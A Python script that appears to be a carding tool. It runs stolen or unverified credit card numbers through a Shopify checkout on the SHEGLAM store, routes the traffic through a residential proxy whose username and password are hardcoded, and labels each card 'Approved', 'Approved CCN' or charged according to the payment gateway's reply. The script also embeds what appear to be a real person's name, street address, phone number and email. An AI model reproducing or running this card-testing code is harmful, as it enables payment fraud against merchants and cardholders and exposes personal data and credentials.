import time
import random 
import string
from requests import Session
from retry_requests import retry
def QueryNotice(data):
        try: 
            start = data.index('notice__text">') + len('notice__text">')
            end   = data.index( '<' ,start)
            return       data [start:end]
        except: return 'Card was declined'
def shayden(cc, mes, ano, cvv):
    try:
        session = retry(Session(), retries=5, backoff_factor=0.2)
        https_proxy = 'http://17f478d14ce695e5:RNW78Fm5@res.proxy-seller.com:10000'
        proxies = {"http": https_proxy,"https": https_proxy}
        session.proxies = proxies
        acii = string.ascii_letters + string.digits
        token = ''.join(random.choice(acii) for i in range(86))
        username = ''.join(random.choices('abcdefghijklmnñopqrstuvwxyz', k=10))
        mail = username + '@gmail.com'
        dataa = {'id': '42462814011557'}
        session.get(url='https://www.sheglam.com/cart/add',params= dataa)
        req_1 = session.get(url='https://www.sheglam.com/checkout')
        urlch = req_1.url
        data2 = f'_method=patch&authenticity_token={token}&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D=diegopp699%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Battributes%5D%5BCPF+Number%5D=&checkout%5Bshipping_address%5D%5Bfirst_name%5D=Brayam&checkout%5Bshipping_address%5D%5Blast_name%5D=Condori&checkout%5Bshipping_address%5D%5Baddress1%5D=8333+Northwest+66th+Street&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=Miami&checkout%5Bshipping_address%5D%5Bprovince%5D=FL&checkout%5Bshipping_address%5D%5Bzip%5D=33166&checkout%5Bshipping_address%5D%5Bphone%5D=7867609594&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=804&checkout%5Bclient_details%5D%5Bbrowser_height%5D=951&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240&checkout%5Battributes%5D%5BdeviceCode%5D=%7B%22billno%22%3A%22%22%2C%22scene%22%3A%222%22%2C%22siteFrom%22%3A%22sheglam%22%2C%22siteName%22%3A%22SHEGLAM%22%2C%22siteId%22%3A%2230%22%2C%22deviceCodes%22%3A%7B%22cookie_id%22%3A%22b1ef8d62-53cc-44c3-bd07-f070e93c84b2%22%7D%7D'
        headers = {'Content-Type': 'application/x-www-form-urlencoded','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'}
        session.post(urlch,data2,headers)
        data3 = f'_method=patch&authenticity_token={token}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Standard%2520Shipping-4.59&checkout%5Bclient_details%5D%5Bbrowser_width%5D=821&checkout%5Bclient_details%5D%5Bbrowser_height%5D=951&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240&checkout%5Battributes%5D%5BdeviceCode%5D=%7B%22billno%22%3A%22%22%2C%22scene%22%3A%222%22%2C%22siteFrom%22%3A%22sheglam%22%2C%22siteName%22%3A%22SHEGLAM%22%2C%22siteId%22%3A%2230%22%2C%22deviceCodes%22%3A%7B%22cookie_id%22%3A%22b1ef8d62-53cc-44c3-bd07-f070e93c84b2%22%7D%7D'
        session.post(urlch,data3,headers)

        data4= {"credit_card": {"number": f"{cc[0:4]} {cc[4:8]} {cc[8:12]} {cc[12:16]}","name": username,"month": mes,"year": ano,"verification_value": cvv},"payment_session_scope": 'www.sheglam.com'}
        req_2 =session.post(url= 'https://deposit.us.shopifycs.com/sessions', json=data4)
        id_west = req_2.json()['id']
        data5 = f'_method=patch&authenticity_token={token}&previous_step=payment_method&step=&s={id_west}&checkout%5Bpayment_gateway%5D=75261280421&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=812&checkout_submitted_request_url=https%3A%2F%2Fwww.sheglam.com%2F45383057573%2Fcheckouts%2F734b4141bb2bf1b4d73ce2999b9790bf&checkout_submitted_page_id=58fd8bef-4DA7-49E3-C3A1-45CB14D75750&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=804&checkout%5Bclient_details%5D%5Bbrowser_height%5D=951&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240&checkout%5Battributes%5D%5BdeviceCode%5D=%7B%22billno%22%3A%22%22%2C%22scene%22%3A%222%22%2C%22siteFrom%22%3A%22sheglam%22%2C%22siteName%22%3A%22SHEGLAM%22%2C%22siteId%22%3A%2230%22%2C%22deviceCodes%22%3A%7B%22cookie_id%22%3A%22b1ef8d62-53cc-44c3-bd07-f070e93c84b2%22%7D%7D&checkout%5Battributes%5D%5BriskInfo%5D=%7B%22sm_device_id%22%3A%22Wlsel6H6wYo2sFdoqKyeJkcGanr76euIHTReu%2BM6W0NImwf9%2F%2BEULPx7ZDoQ8uXTXOI7fcri0o8LipWquo9hJxGg18eA9H%2BUPlZ5NiVnrWQVSp3CpJQkpiYoILV6iozhofxhhO1zvIfHNmEFC3Pruq9oBWz%2FROuTyCw7MbTHfmS74KUS1%2Byc6hahYBKsCYbj2ulZsj7v28xzIWxwdLrdmlUYFPHjQvUGfut4Y2RhwdyUvo6CGE5UvVB8Nhd7MuIfEBg%2Bdlm5Z3z8%3D1487577677129%22%2C%22anti_in%22%3A%221_1.1.0-shopify_d0d857_zmIbG4sqm5lj6JosVmInm2CIS7-pKeEyc-xU3KTWKTTPUHaA5Z21vUZE-k4F6vbvYU-1S_r4vQLR7zQMbKYHf7vgvd5iPf7ndWgm8lm9nZK6LFNLGx38oz52rsOOvzn74RF1PQhoAkoTLxgegcxly0wTRgycZD0epFZBv9pJQ9A1AJDwGWEfylOieKHyrLIyd1AwDgdN0hoBe6zejTTJW5qhy1tSFNQ0HPa9GifNDPfIJeJnBFEciEKmUhRb6sNC5YVTx7rFIvD96-G9X9EhdI3Tw1XSo9RJiREuIbFRs1B2CZHr2cppxasrLC4F1HaZGWGOJ8-1v4DTrsJumxGxjeo61eV8C9WAj7ueKlsYZsnTHnWVBy5988uIgpMheQLW8slnY0Eh7ZRW1hkxxMmqghKb7ixaGrRwVV7_1UJX-Ad4tb6VHB1ddLZ6N08UxF_0meXAX_ZykKLLMxDJrWAqlXEYZC66h1vOvC2ojSl-gxF2K2JEUmI2mn79nAtmEVJfhASF2gBa8nkZJMz3fNsEcavGk5EA5zFTW-mZ_Nu-stlT9-pq66xQMbAyQpYRc6QEWPdMupA4qypklz3Vw_y2W2-UMl47hj7My_85eMLlMp6berHQsBinhSNzzrv8VH3UDDdL4FIuaeSTToO-rsNf3lQM2Dm0_mHb5G9PvnjDEY5KPHpnY1xuo29hSh1zqIywyyGSq_j77tpmzJB99Vn_J0QTf2LfNzKHJAOZrzgZxPe-HGj47CRp7A1nuILlAYEqP43tbsEYfycAL2aMj_OMyNpPaAee0cdtYMy4wmCJXx8%22%2C%22channel%22%3A1%2C%22browser_mode%22%3A%22Chrome%22%2C%22browser_versions%22%3A%22127.0.0.0%22%2C%22device_system_version%22%3A%22Windows+10%22%2C%22risk_id%22%3A%2260fc93e1-9009-4a2e-a412-1dbb231402de%22%2C%22biz_id%22%3A%22shopify-sheglam301723774904397sGDb5M%22%7D'
        req_3 = session.post(urlch, data5)
        time.sleep(4)
        req_4 = session.get(str(req_3.url) + '?from_processing_page=1')
        req_5 = session.get(req_4.url)
        resultados = QueryNotice(req_5.text)
        if 'Transaction Normal - Insufficient Funds' == resultados: return resultados,'Approved ✅'
        elif 'Data within the transaction is incorrect - Approved' == resultados: return resultados, 'Approved ✅'
        elif 'Street address and postal code do not match' == resultados: return resultados,'Approved ✅'
        elif 'No Match' == resultados: return resultados,'Approved ✅'
        elif 'Invalid card verification number' == resultados: return resultados,'Approved ✅'
        elif 'CVC Declined | N7 : Decline for CVV2 failure' == resultados: return resultados,'Approved CCN!✅'
        elif 'Charged' == resultados: return resultados,'charged $12.00 ✅'
        elif '/thank_you' in str(req_5.url) or '/orders/' in str(req_5.url) or '/post_purchase' in str(req_5.url): return  'charged $12.00','Approved ✅'
        elif '/3d_secure_2/' in str(req_5.url): return '3d_secure_2'
        elif 'There was a problem processing the payment. Try refreshing this page or check your internet connection.' == resultados: return resultados,'Error => General Decline by shopify'
        else: return resultados,'DECLINED  ❌'
    except: return 'Card was declined','DECLINED ❌'